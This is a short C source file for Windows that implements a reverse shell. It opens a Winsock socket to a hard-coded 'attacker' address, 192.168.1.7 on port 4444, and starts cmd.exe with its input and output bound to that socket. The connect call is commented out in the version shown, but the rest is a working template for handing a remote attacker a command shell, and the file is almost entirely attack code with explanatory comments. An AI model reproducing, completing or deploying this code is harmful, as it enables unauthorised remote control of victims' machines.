#include <windows.h> // contains the windows API
#include <stdio.h> // contains the standard input and output functions

// Link to the w2_32 library
#pragma comment(lib, "ws2_32")


int main() {
 WSADATA socketdata;
 SOCKET theSocket;
 struct sockaddr_in connectionaddress;
 char* attackersIP = "192.168.1.7"; // Attackers IP address
 short attackersPort = 4444; // attackers port

 // Populating the structure with the addresses to connect to
 connectionaddress.sin_family = AF_INET;
 connectionaddress.sin_addr.s_addr = inet_addr(attackersIP);
 connectionaddress.sin_port = htons(attackersPort);

 WSAStartup(MAKEWORD(2, 2), &socketdata);

 // creating a TCP socket to use IPv4 addressing
 theSocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

 //Error handling if the socket creation goes wrong
 // if (theSocket == INVALID_SOCKET) {
  // printf("[!] - Something Went wrong during socket creation: %d\n",WSAGetLastError());
 // }
 // printf("[*] Socket Successfully created.\n");

 // // Connecting the socket
 // printf("[*] Socket connecting to the Attacker at %s:%d.\n",attackersIP,attackersPort);
 // int connectionEstablished = WSAConnect(theSocket, &connectionaddress, sizeof(connectionaddress), NULL, NULL, NULL, NULL);

 // if (connectionEstablished == 0) {
  // printf("Connection Successful.\n");
 // }
 // else {
  // printf("\t\\");
  // printf("____ [!] Connecting failed due to: %d\n", WSAGetLastError());
 // }
 
 STARTUPINFOA startupInformation; //Useful information to start a process
 HANDLE Sockethandle = (HANDLE)theSocket; // Handle to the socket to read/write to it


 memset(&startupInformation, 0, sizeof(startupInformation)); // Fill the memory address of the structure with 0
 startupInformation.cb = sizeof(startupInformation);
 startupInformation.dwFlags = STARTF_USESTDHANDLES;
 startupInformation.hStdError = startupInformation.hStdInput = startupInformation.hStdOutput = Sockethandle;

 PROCESS_INFORMATION processInformation; // contains information about the process.
 
 if (CreateProcessA(NULL,"cmd.exe",NULL,NULL,TRUE,DETACHED_PROCESS,NULL,NULL,&startupInformation,&processInformation)) {
  printf("[*] The Process was created successfully. PID: %d", processInformation.dwProcessId);
 }
}